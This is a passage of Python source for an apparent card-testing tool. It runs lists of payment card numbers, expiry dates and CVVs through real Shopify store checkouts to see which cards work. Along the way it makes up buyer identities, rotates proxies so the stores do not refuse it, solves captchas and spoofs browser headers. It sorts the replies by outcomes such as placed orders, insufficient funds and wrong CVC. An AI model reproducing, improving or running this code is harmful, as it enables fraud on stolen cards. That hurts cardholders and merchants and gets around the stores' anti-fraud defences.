    pool = _proxy_healthy or _load_proxy_pool()
    if not pool:
        return None
    return random.choice(pool)


def _load_sites_from_file() -> list[str]:
    """Merchants the API falls back on when the caller names no site."""
    global _sites_cache, _sites_loaded_at
    if _sites_cache and (time.time() - _sites_loaded_at) < 300:
        return _sites_cache
    out: list[str] = []
    path = SITES_FILE
    if not os.path.isabs(path):
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), path)
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                s = line.strip()
                if s and not s.startswith("#") and "." in s:
                    s = s.replace("https://", "").replace("http://", "").strip("/")
                    if s not in out:
                        out.append(s)
    except Exception:
        pass
    _sites_cache = out
    _sites_loaded_at = time.time()
    return out


def _reload_cards() -> None:
    global _cards_cache, _cards_loaded_at
    _cards_cache  = _load_cards_from_file()
    _cards_loaded_at = time.time()


def _load_cards_from_file() -> list[dict]:
    cards = []
    if not os.path.exists(CARDS_FILE):
        return cards
    with open(CARDS_FILE, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            card = _parse_card(line.strip())
            if card:
                cards.append(card)
    return cards


def _get_cards() -> list[dict]:
    global _cards_cache, _cards_loaded_at
    if not _cards_cache or (time.time() - _cards_loaded_at) > 120:
        _reload_cards()
    return _cards_cache


def _parse_card(raw: str) -> Optional[dict]:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    parts = raw.replace(" ", "").split("|")
    if len(parts) != 4:
        return None
    cc_num, mon, yr, cvv = [p.strip() for p in parts]
    if not (cc_num.isdigit() and mon.isdigit() and yr.isdigit() and cvv.isdigit()):
        return None
    if len(yr) == 4:
        yr = yr[2:]
    if len(yr) != 2:
        return None
    if not 1 <= int(mon) <= 12:
        return None
    if len(cc_num) < 13 or len(cc_num) > 19:
        return None
    return {"cc": cc_num, "month": mon, "year": yr, "cvv": cvv}


def _parse_proxy(raw: Optional[str]) -> Optional[str]:
    if not raw:
        return None
    s = raw.strip()
    if not s:
        return None
    if "://" in s:
        return s
    if "@" in s and ":" in s:
        return f"http://{s}"
    parts_ws = s.split()
    if len(parts_ws) == 4:
        user, pwd, host, port = parts_ws
        return f"http://{user}:{pwd}@{host}:{port}"
    parts = s.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None


def _parse_proxy_any(raw: Optional[str]) -> Optional[str]:
    """A proxy, or one picked from a list of them.

    A caller may hand in several proxies separated by commas; each check
    then leaves from a different address, which is what keeps the stores
    from refusing the checkout.
    """
    if not raw:
        return None
    raw = raw.strip()
    if "," in raw:
        choices = [p.strip() for p in raw.split(",") if p.strip()]
        if not choices:
            return None
        # The proxies that are known to be dead are left out: one of
        # them would cost the whole check.
        good = [p for p in choices if _proxy_health.get(p, True)]
        if not good:
            good = choices
        return random.choice(good)
    if _proxy_health.get(raw) is False:
        return None
    return raw


def _pick_address(url: str, currency: Optional[str] = None) -> dict:
    netloc = urlparse(url).netloc.split(":")[0]
    tld    = netloc.split(".")[-1].upper()
    if tld in ADDRESS_BOOK:
        return ADDRESS_BOOK[tld]
    if currency:
        cc = C2C.get(currency.upper())
        if cc and cc in ADDRESS_BOOK:
            return ADDRESS_BOOK[cc]
    return ADDRESS_BOOK["DEFAULT"]


def _random_identity() -> tuple[str, str, str]:
    first = random.choice(FIRST_NAMES)
    last  = random.choice(LAST_NAMES)
    email = f"{first.lower()}.{last.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    return first, last, email


def _extract(text: str, start: str, end: str) -> Optional[str]:
    idx = text.find(start)
    if idx == -1:
        return None
    sub     = text[idx + len(start):]
    end_idx = sub.find(end)
    if end_idx == -1:
        return None
    val = sub[:end_idx]
    return val if val else None


def _extract_sst(text: str, headers: dict) -> Optional[str]:
    for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
        if key in headers:
            return headers[key]
    patterns = [
        ('name="serialized-sessionToken" content="&quot;', "&quot;"),
        ('name="serialized-sessionToken" content="', '"'),
        ('"serializedSessionToken":"',   '"'),
        ('"sessionToken":"',             '"'),
        ("sessionToken&quot;:&quot;",   "&quot;"),
        ('data-session-token="',         '"'),
        ('"checkout_session_token":"',   '"'),
    ]
    for s, e in patterns:
        val = _extract(text, s, e)
        if val and len(val) > 10:
            return val
    return None


def _normalize_response(raw: Optional[str]) -> str:
    if not raw:
        return "CARD_DECLINED"
    msg = str(raw).upper()

    if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE", "ORDER_CREATED")):
        return "ORDER_PLACED"
    if any(k in msg for k in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP",
                               "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "CHALLENGE",
                               "AUTHENTICATION_REQUIRED", "THREEDSSECURE",
                               "THREE_D_SECURE", "3D_SECURE", "SCA_REQUIRED")):
        return "3DS_REQUIRED"
    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE",
                               "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC",
                               "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
        return "INVALID_CVC"
    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "DO_NOT_HONOR",
                               "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE")):
        return "INSUFFICIENT_FUNDS"
    if any(k in msg for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION",
                               "BASE_EXPIRED", "CARD_EXPIRED", "PAYMENTS_CREDIT_CARD_BASE_EXPIRED")):
        return "EXPIRED_CARD"
    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD",
                               "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT",
                               "CARD_NOT_SUPPORTED")):
        return "INVALID_CARD"
    if any(k in msg for k in ("LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("CALL_ISSUER", "REFER_TO_ISSUER", "CONTACT_ISSUER")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED",
                               "NOT_PERMITTED", "SERVICE_NOT_ALLOWED",
                               "TRY_AGAIN_LATER", "LIMIT_EXCEEDED")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
        return "CAPTCHA_REQUIRED"
    return "CARD_DECLINED"


def _parse_gql_errors(errors: list) -> str:
    for err in errors:
        for field in ("code", "nonLocalizedMessage", "localizedMessage",
                      "message", "localizedMessageHtml", "messageUntranslated"):
            raw = str(err.get(field) or "")
            if not raw:
                continue
            norm = _normalize_response(raw)
            if norm != "CARD_DECLINED":
                return norm
            upper = raw.upper()
            if any(k in upper for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
                return "CAPTCHA_REQUIRED"
            if any(k in upper for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "EXCEEDS_BALANCE")):
                return "INSUFFICIENT_FUNDS"
            if any(k in upper for k in ("BASE_EXPIRED", "CARD_EXPIRED", "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
                                        "EXPIRED_CARD", "INVALID_EXPIRY")):
                return "EXPIRED_CARD"
            if any(k in upper for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE", "CVV_FAILURE", "INCORRECT_CVC")):
                return "INVALID_CVC"
            if any(k in upper for k in ("PAYMENT_DECLINED", "CARD_DECLINED",
                                         "CHARGE_DECLINED", "CARD_WAS_DECLINED",
                                         "FRAUD")):
                return "CARD_DECLINED"
            if any(k in upper for k in ("CHECKOUT_ALREADY_COMPLETED", "ALREADY_ACCEPTED")):
                return "CARD_DECLINED"
            if any(k in upper for k in ("SESSION_EXPIRED", "SESSION_INVALID",
                                         "TOKEN_EXPIRED", "INVALID_SESSION")):
                return "SESSION_EXPIRED"
            if any(k in upper for k in ("LOGIN_REQUIRED", "ACCOUNT_REQUIRED",
                                         "CUSTOMER_DISABLED")):
                return "SITE_REQUIRES_LOGIN"
            if any(k in upper for k in ("OUT_OF_STOCK", "SOLD_OUT",
                                         "INVENTORY_CLAIM", "INVENTORY_RESERVATION")):
                return "NO_PRODUCT"
            if any(k in upper for k in ("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS",
                                         "RATE_LIMITED", "RETRY_LATER")):
                return "THROTTLED"
    return "GRAPHQL_ERROR"


def _make_session(proxy_str: Optional[str]) -> tuple[LoggedSession, bool]:
    proxy = _parse_proxy_any(proxy_str) if proxy_str else None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    session = LoggedSession(AsyncSession(impersonate=IMPERSONATE, timeout=REQUEST_TIMEOUT, proxies=proxies))
    return session, True


# ---------------------------------------------------------------------------
# Product fetching with TTL cache
# ---------------------------------------------------------------------------
async def _fetch_products(
    base_url: str,
    proxy_str: Optional[str] = None,
    max_price: float = MAX_PRICE,
) -> tuple[Optional[dict], list[dict], Optional[str]]:
    if not base_url.startswith("http"):
        base_url = "https://" + base_url

    hostname = urlparse(base_url).netloc
    now      = time.time()

    cached = _product_cache.get(hostname)
    if cached and (now - cached["ts"]) < _product_cache_ttl(cached):
        return cached.get("product"), cached.get("candidates", []), cached.get("err")

    # Only one fetch per store at a time; the rest wait for its result.
    async with _product_locks[hostname]:
        now = time.time()
        cached = _product_cache.get(hostname)
        if cached and (now - cached["ts"]) < _product_cache_ttl(cached):
            return cached.get("product"), cached.get("candidates", []), cached.get("err")

        return await _fetch_products_locked(base_url, proxy_str, max_price, hostname)


async def _fetch_products_locked(
    base_url: str,
    proxy_str: Optional[str],
    max_price: float,
    hostname: str,
) -> tuple[Optional[dict], list[dict], Optional[str]]:
    """The actual fetch.  The caller holds the store's lock.

    The product list is a public page, so it is fetched DIRECTLY even
    when the checkout goes through a proxy.  A proxy that cannot reach
    the store would otherwise make every card on that store wait for a
    product list that never arrives.
    """
    now = time.time()

    session, owned = _make_session(None)

    try:
        all_variants: list[dict] = []
        urls_to_try = [
            f"{base_url}/products.json?limit=250&sort_by=price-ascending",
            f"{base_url}/products.json?limit=250",
        ]
        for url in urls_to_try:
            try:
                resp = await session.get(url, allow_redirects=True)
                if resp.status_code == 200:
                    data     = orjson.loads(resp.content)
                    products = data.get("products", [])
                    if products:
                        all_variants = products
                        break
                elif resp.status_code in (429, 430):
                    err = "THROTTLED"
                    _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": now, "ok": False}
                    return None, [], err
            except Exception:
                continue

        candidates: list[dict] = []
        any_variant: list[dict] = []
        best: Optional[dict] = None
        best_price = float("inf")
        cheapest_any: Optional[dict] = None
        cheapest_any_price = float("inf")

        if not all_variants:
            try:
                import xml.etree.ElementTree as ET
                import re as _re
                sitemap_url = f"{base_url}/sitemap_products_1.xml"
                smap_resp = await session.get(sitemap_url, allow_redirects=True)
                if smap_resp.status_code == 200:
                    root = ET.fromstring(smap_resp.content)
                    urls = []
                    for child in root:
                        if child.tag.endswith('url'):
                            for loc in child:
                                if loc.tag.endswith('loc'):
                                    urls.append(loc.text)

                    if urls:
                        sample_urls = random.sample(urls, min(25, len(urls)))
                        for purl in sample_urls:
                            try:
                                p_resp = await session.get(purl, allow_redirects=True)
                                matches = _re.finditer(
                                    r'"id":(\d+).*?"inStock":true.*?,"price":([\d.]+)',
                                    p_resp.text,
                                )
                                for m in matches:
                                    variant_id = m.group(1)
                                    price = float(m.group(2))
                                    if price <= 0:
                                        continue
                                    entry = {
                                        "site":       base_url,
                                        "price":      f"{price:.2f}",
                                        "price_f":    price,
                                        "variant_id": str(variant_id),
                                        "title":      "Product",
                                        "handle":     "",
                                    }
                                    any_variant.append(entry)
                                    if price < cheapest_any_price:
                                        cheapest_any_price = price
                                        cheapest_any       = entry
                                    if price <= max_price:
                                        candidates.append(entry)
                                        if price < best_price:
                                            best_price = price
                                            best       = entry
                            except Exception:
                                pass
            except Exception:
                pass

            if not any_variant:
                err = "No products found"
                _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": now, "ok": False}
                return None, [], err
        else:
            for product in all_variants:
                for variant in product.get("variants", []):
                    try:
                        avail = variant.get("available", True)
                        if avail is False:
                            continue
                        price = float(variant.get("price") or "0")
                    except (ValueError, TypeError):
                        continue
                    if price <= 0:
                        continue

                    entry = {
                        "site":       base_url,
                        "price":      f"{price:.2f}",
                        "price_f":    price,
                        "variant_id": str(variant["id"]),
                        "title":      product.get("title", "Product"),
                        "handle":     product.get("handle", ""),
                    }
                    any_variant.append(entry)

                    if price < cheapest_any_price:
                        cheapest_any_price = price
                        cheapest_any       = entry

                    if price <= max_price:
                        candidates.append(entry)
                        if price < best_price:
                            best_price = price
                            best       = entry

        # Hard price ceiling.  Never fall back to a variant above max_price --
        # a $40 item charged against a card is not a $1 test.
        if not candidates:
            cheapest_txt = (f"${cheapest_any_price:.2f}" if cheapest_any is not None else "n/a")
            err = f"No products under ${max_price:.2f} (cheapest is {cheapest_txt})"
            _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": now, "ok": True}
            return None, [], err

        if not best:
            err = f"No products under ${max_price:.2f}"
            _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": now, "ok": True}
            return None, [], err

        _product_cache[hostname] = {
            "ok":         True,
            "product":    best,
            "candidates": candidates,
            "err":        None,
            "ts":         now,
            "fallback":   False,
        }
        return best, candidates, None

    except (asyncio.TimeoutError, RequestsError):
        err = "Timeout"
        return None, [], err
    except Exception as ex:
        return None, [], str(ex)
    finally:
        if owned:
            res = session.close()
            if asyncio.iscoroutine(res):
                await res


# ---------------------------------------------------------------------------
# Core checkout validator
# ---------------------------------------------------------------------------
async def validate_card(
    cc:         str,
    month:      str,
    year:       str,
    cvv:        str,
    site_url:   str,
    variant_id: Optional[str] = None,
    proxy_str:  Optional[str] = None,
    max_price:  Optional[float] = None,
    candidate_index: int = 0,
) -> dict:
    t0       = time.time()
    gateway  = "UNKNOWN"
    price    = "0.00"
    currency = "USD"
    product_title = ""
    effective_max_price = max_price if max_price is not None else MAX_PRICE

    site_url = site_url.strip()
    ourl     = site_url if site_url.startswith("http") else f"https://{site_url}"
    hostname = urlparse(ourl).netloc
    proxy    = _parse_proxy(proxy_str)
    ua       = random.choice(USER_AGENTS)

    def _r(response: str, charged: str = "False", approved: str = "False",
           message: Optional[str] = None,
           is_site_error: Optional[bool] = None,
           proxy_dead: bool = False) -> dict:
        code_upper = response.upper()
        if is_site_error is None:
            is_site_error = code_upper not in KNOWN_CARD_RESPONSES

        final_gateway = gateway if gateway and gateway != "UNKNOWN" else "Shopify Payments"
        proxy_status  = "Dead" if proxy_dead else "Live"

        return {
            "Response":     response,
            "Message":      message or response,
            "code":         response,
            "decline_code": response,
            "Gateway":      final_gateway,
            "Price":        price,
            "Proxy":        proxy_status,
            "Status":       (not is_site_error),
            "Gate":         final_gateway,
            "CC":           f"{cc}|{month}|{year}|{cvv}",
            "Product":      product_title,
            "Site":         ourl,
            "Charged":      charged,
            "Approved":     approved,
            "Time":         f"{round(time.time() - t0, 2)}s",
            "Retry":        is_site_error,
        }

    sem = _site_semaphores[hostname]
    session, owned = _make_session(proxy_str)

    async with sem:
        try:
            addr         = _pick_address(ourl)
            country_code = addr["countryCode"]
            first, last, email = _random_identity()
            phone  = addr["phone"]
            street = addr["address1"]
            city   = addr["city"]
            state  = addr["zoneCode"]
            s_zip  = addr["postalCode"]

            # ── 0. Fetch product ─────────────────────────────────────────
            best, all_candidates, err = await _fetch_products(ourl, proxy_str)

            if all_candidates:
                candidates_under_max = [
                    c for c in all_candidates
                    if float(c.get("price", 999999)) <= effective_max_price
                ]
                # Cheapest first, so a product that fits the cap after
                # shipping is found before an expensive one.
                candidates_under_max.sort(key=lambda c: float(c.get("price_f") or 0))
            else:
                candidates_under_max = (
                    [best] if (best and float(best.get("price", 999999)) <= effective_max_price) else []
                )

            if variant_id:
                matched = next(
                    (c for c in (all_candidates or []) if str(c.get("variant_id")) == str(variant_id)),
                    None,
                )
                if not matched:
                    return _r(f"PRICE_OVER_MAX: variant {variant_id} is not available",
                              message="Variant not found",
                              is_site_error=True)
                price         = matched["price"]
                product_title = matched.get("title", "")
                try:
                    if float(price) > effective_max_price:
                        return _r(f"PRICE_OVER_MAX: base price ${price} > ${effective_max_price:.2f}",
                                  message=f"${price} > ${effective_max_price:.2f}",
                                  is_site_error=True)
                except (ValueError, TypeError):
                    pass
            else:
                if not candidates_under_max:
                    return _r(f"NO_PRODUCT: {err or f'No products under ${effective_max_price:.2f}'}",
                              message=err or "No products",
                              is_site_error=True)
                # Walk the candidates cheapest-first.  The caller bumps
                # candidate_index when the real total (with shipping and
                # tax) comes out over the cap.
                idx = min(candidate_index, len(candidates_under_max) - 1)
                chosen_prod   = candidates_under_max[idx]
                variant_id    = chosen_prod["variant_id"]
                price         = chosen_prod["price"]
                product_title = chosen_prod.get("title", "")

            base_headers = {
                "User-Agent":         ua,
                "Accept":             "application/json, text/plain, */*",
                "Accept-Language":    "en-US,en;q=0.9",
                "Content-Type":       "application/json",
                "Origin":             ourl,
                "Referer":            f"{ourl}/",
                "sec-ch-ua":          '"Chromium";v="136", "Not_A.Brand";v="24"',
                "sec-ch-ua-mobile":   "?0",
                "sec-ch-ua-platform": '"Windows"',
            }

            # ── 1. Add to cart ──────────────────────────────────────────
            cart_added = False
            throttled  = False
            for payload, ct in [
                (f"id={variant_id}&quantity=1",
                 "application/x-www-form-urlencoded"),
                (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}),
                 "application/json"),
            ]:
                try:
                    r = await session.post(
                        f"{ourl}/cart/add.js",
                        data=payload,
                        headers={**base_headers, "Content-Type": ct, "Accept": "application/json"},
                    )
                    if r.status_code == 200:
                        cart_added = True
                        break
                    # Cloudflare answers a store that is rate limiting us
                    # with a 429 (or "Error 1015").  That is not a broken
                    # store, it is a store that needs room, so it is said
                    # out loud and left alone for a while.
                    if r.status_code == 429 or "too_many_requests" in r.text \
                            or "Error 1015" in r.text:
                        throttled = True
                        break
                except Exception:
                    continue

            if not cart_added:
                if throttled:
                    return _r("THROTTLED",
                              message="The store is rate limiting us (HTTP 429)",
                              is_site_error=True)
                return _r("CART_FAILED", message="Could not add to cart", is_site_error=True)

            # ── 2. Get checkout page ────────────────────────────────────
            try:
                cr = await session.post(
                    f"{ourl}/checkout/",
                    allow_redirects=True,
                    headers={**base_headers,
                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                )
                checkout_url = str(cr.url)
                page_text    = cr.text
            except (asyncio.TimeoutError, RequestsError):
                return _r("TIMEOUT", message="Checkout timed out", is_site_error=True)
            except Exception as ex:
                return _r(f"CHECKOUT_FAILED: {type(ex).__name__}",
                          message=str(ex)[:100],
                          is_site_error=True)

            # ── 2b. Captcha detection & solve ──────────────────────────
            captcha_indicators = ('hcaptcha', 'recaptcha', 'turnstile',
                                  'cf-challenge', 'challenge-platform')
            if any(ind in page_text.lower() for ind in captcha_indicators):
                log.warning("[CAPTCHA] Detected on checkout page — solving...")
                captcha_token = await detect_and_solve_captcha(checkout_url, page_text, debug=True)
                if captcha_token:
                    log.warning("[CAPTCHA] Solved! Retrying with token...")
                    try:
                        cr2 = await session.get(
                            checkout_url,
                            allow_redirects=True,
                            headers={**base_headers,
                                     "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                                     "x-captcha-token": captcha_token,
                                     "x-turnstile-token": captcha_token,
                                     "x-hcaptcha-token": captcha_token},
                        )
                        if cr2.status_code == 200 and len(cr2.text) > len(page_text) * 0.5:
                            page_text = cr2.text
                            checkout_url = str(cr2.url)
                    except Exception as ex:
                        log.warning("captcha retry failed: %s", ex)
                else:
                    log.warning("[CAPTCHA] Solve failed — continuing anyway")

            lower_url = checkout_url.lower()
            if "login" in lower_url or "/account" in lower_url or "password" in lower_url:
                return _r("SITE_REQUIRES_LOGIN", message="Store requires login", is_site_error=True)

            m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
            if m:
                attempt_token = m.group(1)
            else:
                attempt_token = checkout_url.rstrip("/").split("/")[-1].split("?")[0]

            if not attempt_token or len(attempt_token) < 4:
                return _r("NO_ATTEMPT_TOKEN", message="No attempt token in URL", is_site_error=True)

            sst = _extract_sst(page_text, dict(cr.headers))
            if not sst:
                return _r("NO_SESSION_TOKEN", message="No session token in HTML", is_site_error=True)

            queue_token = (
                _extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
                _extract(page_text, '"queueToken":"', '"')
            )
            stable_id = (
                _extract(page_text, 'stableId&quot;:&quot;', "&quot;") or
                _extract(page_text, '"stableId":"', '"') or
                "1"
            )

            merch_gid = (
                _extract(page_text, "ProductVariantMerchandise/", "&quot;") or
                _extract(page_text, "ProductVariantMerchandise/", '&q') or
                _extract(page_text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                str(variant_id)
            )

            for s, e in [
                ('currencyCode&quot;:&quot;', "&quot;"),
                ('"currencyCode":"', '"'),
            ]:
                val = _extract(page_text, s, e)
                if val and len(val) == 3 and val.isalpha():
                    currency = val.upper()
                    break

            addr         = _pick_address(ourl, currency)
            country_code = addr["countryCode"]
            phone        = addr["phone"]
            street       = addr["address1"]
            city         = addr["city"]
            state        = addr["zoneCode"]
            s_zip        = addr["postalCode"]

            subtotal = (
                _extract(page_text,
                         'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                         "&quot;") or
                _extract(page_text,
                         '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            )
            if not subtotal:
                m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
                subtotal = m2.group(1) if m2 else "0.01"

            unescaped  = page_text.replace("&quot;", '"').replace("&amp;", "&")
            build_id   = None
            m3         = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if m3:
                build_id = m3.group(1)

            source_token = _extract(page_text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')

            ident_sig = None
            m4 = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
            if m4:
                ident_sig = m4.group(1)

            graphql_url = f"https://{hostname}/checkouts/unstable/graphql"

            gql_headers = {
                **base_headers,
                "shopify-checkout-client":  "checkout-web/1.0",
                "shopify-checkout-source":  f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            if build_id:
                gql_headers["x-checkout-web-build-id"]     = build_id
                gql_headers["x-checkout-web-deploy-stage"] = "production"
            if source_token:
                gql_headers["x-checkout-web-source-id"] = source_token

            merch_id_full   = f"gid://shopify/ProductVariantMerchandise/{merch_gid}"
            variant_id_full = f"gid://shopify/ProductVariant/{variant_id}"

            def _base_vars() -> dict:
                return {
                    "sessionInput":  {"sessionToken": sst},
                    "queueToken":    queue_token or "",
                    "discounts":     {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "partialStreetAddress": {
                                    "address1": street, "address2": "", "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": first, "lastName": last,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments":              {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes":    ["SHIPPING"],
                            "expectedTotalPrice":     {"any": True},
                            "destinationChanged":     True,
                        }],
                        "noDeliveryRequired":          [],
                        "useProgressiveRates":         False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping":       True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id":               merch_id_full,
                                    "variantId":        variant_id_full,
                                    "properties":       [],
                                    "sellingPlanId":    None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity":             {"items": {"value": 1}},
                            "expectedTotalPrice":   {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None,
                            "lineComponents":       [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": "", "city": "", "countryCode": country_code,
                                "lastName": "", "zoneCode": state, "phone": "",
                            }
                        },
                    },
                    "buyerIdentity": {
                        "customer":          {"presentmentCurrency": currency, "countryCode": country_code},
                        "email":             email,
                        "emailChanged":      False,
                        "phoneCountryCode":  country_code,
                        "marketingConsent":  [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe":        False,
                    },
                    "tip":   {"tipLines": []},
                    "taxes": {
                        "proposedAllocations":         None,
                        "proposedTotalAmount":         {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions":          [],
                    },
                    "note":               {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint":  {
                        "signature":             None, "signatureUuid":         None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "memberships": {"memberships": []},
                    "cartMetafields": [],
                }

            # ── 3. Shipping proposal ─────────────────────────────────────
            ship_vars      = _base_vars()
            resp_json: Any = None

            for attempt in range(3):
                try:
                    r = await session.post(
                        graphql_url,
                        params={"operationName": "Proposal"},
                        headers=gql_headers,
                        json={"query": QUERY_PROPOSAL_SHIPPING, "variables": ship_vars,
                              "operationName": "Proposal"},
                    )
                    resp_json = orjson.loads(r.content)
                except (orjson.JSONDecodeError, asyncio.TimeoutError, RequestsError):
                    if attempt < 2:
                        await asyncio.sleep(1)
                    continue

                data = resp_json.get("data", {}) or {}
                if data.get("session"):
                    break

                gql_errs = resp_json.get("errors", []) or []
                if gql_errs:
                    log.debug("shipping proposal GQL errors: %s", gql_errs)
                    interpreted = _parse_gql_errors(gql_errs)
                    if interpreted in ("SESSION_EXPIRED", "SITE_REQUIRES_LOGIN",
                                       "THROTTLED", "NO_PRODUCT"):
                        return _r(interpreted, message=str(gql_errs[:1])[:120], is_site_error=True)
                    if attempt < 2:
                        await asyncio.sleep(1.5)
                        continue
                    return _r(interpreted if interpreted != "GRAPHQL_ERROR"
                              else "GRAPHQL_ERROR",
                              message=str(gql_errs[:1])[:120],
                              is_site_error=True)

            if not resp_json or not (resp_json.get("data") or {}).get("session"):
                return _r("GRAPHQL_ERROR", message="No session in shipping response", is_site_error=True)

            try:
                _ship_sst = r.headers.get("x-checkout-one-session-token")
                if _ship_sst:
                    sst = _ship_sst
                    gql_headers["x-checkout-one-session-token"] = sst
            except Exception:
                pass

            session_data = resp_json["data"]["session"]
            negotiate    = session_data.get("negotiate") or {}

            neg_errors = negotiate.get("errors") or []
            if neg_errors:
                code = _parse_gql_errors(neg_errors)
                if code != "GRAPHQL_ERROR":
                    return _r(code, message=str(neg_errors[:1])[:120], is_site_error=True)

            result_obj  = negotiate.get("result") or {}
            result_type = result_obj.get("__typename", "")

            if result_type == "CheckpointDenied":
                return _r("CHECKPOINTDENIED", message="Checkpoint denied", is_site_error=True)
            if result_type in ("Throttled", "TooManyRequests"):
                return _r("THROTTLED", message="Rate limited", is_site_error=True)
            if result_type == "NegotiationResultFailed":
                return _r("NEGOTIATE_FAILED", message="Negotiation failed", is_site_error=True)

            checkpoint_data = result_obj.get("checkpointData")
            seller          = result_obj.get("sellerProposal") or {}

            if not seller:
                return _r("NO_SELLER_PROPOSAL", message="No seller proposal", is_site_error=True)

            running_total_data = seller.get("runningTotal") or {}
            running_total      = running_total_data.get("value", {}).get("amount") or running_total_data.get("amount", "0")

            delivery_data     = seller.get("delivery") or {}
            delivery_strategy = ""
            shipping_amount   = 0.0
            if delivery_data.get("__typename") == "FilledDeliveryTerms":
                d_lines = delivery_data.get("deliveryLines") or []
                if d_lines:
                    strategies = d_lines[0].get("availableDeliveryStrategies") or []
                    if strategies:
                        # Pick the cheapest strategy -- strategies[0] is often
                        # the most expensive one and blows the price ceiling.
                        def _strategy_cost(s):
                            try:
                                a = s.get("amount") or {}
                                return float(a.get("value", {}).get("amount") or a.get("amount") or "0")
                            except (ValueError, TypeError):
                                return float("inf")
                        cheapest_strategy = min(strategies, key=_strategy_cost)
                        delivery_strategy = cheapest_strategy.get("handle", "")
                        try:
                            amt_data = cheapest_strategy.get("amount") or {}
                            shipping_amount = float(
                                amt_data.get("value", {}).get("amount") or amt_data.get("amount") or "0"
                            )
                        except (ValueError, TypeError):
                            shipping_amount = 0.0

            tax_data   = seller.get("tax") or {}
            tax_amount = 0.0
            if tax_data.get("__typename") == "FilledTaxTerms":
                try:
                    tax_amt_data = tax_data.get("totalTaxAmount") or {}
                    tax_amount = float(
                        tax_amt_data.get("value", {}).get("amount") or tax_amt_data.get("amount") or "0"
                    )
                except (ValueError, TypeError):
                    pass

            payment_data       = seller.get("payment") or {}
            payment_identifier = None
